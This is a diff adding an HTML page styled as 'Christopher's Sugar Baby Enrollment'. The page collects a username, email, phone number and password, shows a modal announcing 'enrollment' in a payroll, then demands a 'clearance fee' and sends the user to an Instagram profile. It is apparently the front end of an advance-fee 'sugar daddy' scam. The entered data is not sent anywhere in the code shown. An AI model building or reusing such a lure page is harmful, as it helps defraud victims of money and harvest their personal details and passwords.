@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+
+</head>
+<body class="bg-gray-100 ">
+    <h1 class="text-4xl font-extrabold font-mono flex justify-center items-center -mb-20 mt-10"> Christopher's Sugar Baby Enrollment</h1>
+    <br>
+     
+    <div class="flex items-center justify-center px-5 border w-full min-h-screen">
+        <div class="bg-cover bg-center rounded-lg shadow-lg w-full max-w-md mt-20 relative" style="background-image: url('../Pay roll/WhatsApp Image 2024-09-02 at 18.29.20_a9df3999.jpg');">
+            <div class="bg-white bg-opacity-20 p-8 rounded-lg">
+                <h2 class="text-2xl font-bold mb-6 text-center">Login</h2>
+                <form id="loginForm">
+                    <div class="mb-4">
+                        <label for="username" class="block text-gray-700 font-medium mb-2">Username</label>
+                        <input type="text" id="username" name="username" class="w-full px-4 py-2 border rounded-lg bg-white bg-opacity-30 backdrop-blur-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="email" class="block text-gray-700 font-medium mb-2">Email</label>
+                        <input type="email" id="email" name="email" class="w-full px-4 py-2 border rounded-lg bg-white bg-opacity-30 backdrop-blur-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="phone" class="block text-gray-700 font-medium mb-2">Phone Number</label>
+                        <input type="number" id="phone" name="phone" class="w-full px-4 py-2 border rounded-lg bg-white bg-opacity-30 backdrop-blur-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="password" class="block text-gray-700 font-medium mb-2">Password</label>
+                        <input type="password" id="password" name="password" class="w-full px-4 py-2 border rounded-lg bg-white bg-opacity-30 backdrop-blur-md border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400" required>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded-lg font-medium hover:bg-blue-600">Continue</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    
+    
+    <!-- Modal -->
+    <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md text-center">
+            <div id="animatedIconContainer" class="my-4 text-5xl text-green-500 flex justify-center"></div>
+            <h2 class="text-2xl font-bold mb-4 text-green-500">Congratulations !!</h2>
+            <p class="mb-2">Congratulation, you have been enrolled to this payroll!!.</p>
+            <p class="text-center mb-6">Click on the below Button to continue </p>
+            <button id="continueBtn" class="w-full bg-green-500 text-white py-2 rounded-lg font-medium hover:bg-green-600 mb-4"
+            onclick="openModal2()">Continue</button>
+        </div>
+    </div>
+
+
+    <div id="modal2" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md text-center">
+            <div id="animatedIconContainer2" class="my-4 text-6xl text-green-500 flex justify-center "></div>
+            <h2 class="text-2xl font-bold mb-4">Pay clearance Fee</h2>
+            <p class="mb-6">To continue with the registration, you need to pay a clearance fee to the owner.</p>
+            <button id="continueBtn2" class="w-full bg-green-500 text-white py-2 rounded-lg font-medium hover:bg-green-600 mb-4">Continue</button>
+           
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Get form data
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const username = document.getElementById('username').value;
+    const phone = document.getElementById('phone').value;
+
+    // Show the modal if all inputs are filled
+    if (email && password &&username && phone) {
+        document.getElementById('modal').classList.remove('hidden');
+    }
+    else {
+        
+    }
+    const animatedIconContainer = document.getElementById('animatedIconContainer');
+    animatedIconContainer.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" width="3em" height="3em" viewBox="0 0 24 24">
+            <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+                <path stroke-dasharray="64" stroke-dashoffset="64" d="M3 12c0 -4.97 4.03 -9 9 -9c4.97 0 9 4.03 9 9c0 4.97 -4.03 9 -9 9c-4.97 0 -9 -4.03 -9 -9Z">
+                    <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.6s" values="64;0" />
+                </path>
+                <path stroke-dasharray="16" stroke-dashoffset="16" d="M8 12l3 3l5 -5">
+                    <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="16;0" />
+                </path>
+            </g>
+        </svg>
+    `;
+
+});
+
+function openModal2 ( ) {
+    document.getElementById('modal2').classList.remove('hidden') 
+    document.getElementById('modal').classList.add('hidden');
+    document.getElementById('animatedIconContainer').innerHTML = '';
+
+
+     const animatedIconContainer2 = document.getElementById('animatedIconContainer2');
+    animatedIconContainer2.innerHTML = `
+   <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24">
+	<rect width="24" height="24" fill="none" />
+	<mask id="lineMdEmailArrowRight0">
+		<g fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+			<path stroke-dasharray="64" stroke-dashoffset="64" d="M4 5h16c0.55 0 1 0.45 1 1v12c0 0.55 -0.45 1 -1 1h-16c-0.55 0 -1 -0.45 -1 -1v-12c0 -0.55 0.45 -1 1 -1Z">
+				<animate fill="freeze" attributeName="stroke-dashoffset" dur="0.6s" values="64;0" />
+			</path>
+			<path stroke-dasharray="24" stroke-dashoffset="24" d="M3 6.5l9 5.5l9 -5.5">
+				<animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="24;0" />
+			</path>
+			<path fill="#000" fill-opacity="0" stroke="none" d="M19 13c3.31 0 6 2.69 6 6c0 3.31 -2.69 6 -6 6c-3.31 0 -6 -2.69 -6 -6c0 -3.31 2.69 -6 6 -6Z">
+				<set fill="freeze" attributeName="fill-opacity" begin="0.8s" to="1" />
+			</path>
+			<path stroke-dasharray="8" stroke-dashoffset="8" d="M16 19h5">
+				<animate fill="freeze" attributeName="stroke-dashoffset" begin="0.8s" dur="0.2s" values="8;0" />
+			</path>
+			<path stroke-dasharray="4" stroke-dashoffset="4" d="M21 19l-2 2M21 19l-2 -2">
+				<animate fill="freeze" attributeName="stroke-dashoffset" begin="1s" dur="0.2s" values="4;0" />
+			</path>
+		</g>
+	</mask>
+	<rect width="24" height="24" fill="currentColor" mask="url(#lineMdEmailArrowRight0)" />
+</svg>
+`;
+}
+
+
+document.getElementById('continueBtn2').addEventListener('click', function() {
+            // Redirect directly to the Instagram profile
+            window.location.href = "https://www.instagram.com/tweathyc?igsh=MXRnZjYycDY5cjU2bA%3D%3D&utm_source=qr"; // Replace with the actual Instagram profile URL
+        });
+    </script>
+</body>
+</html>
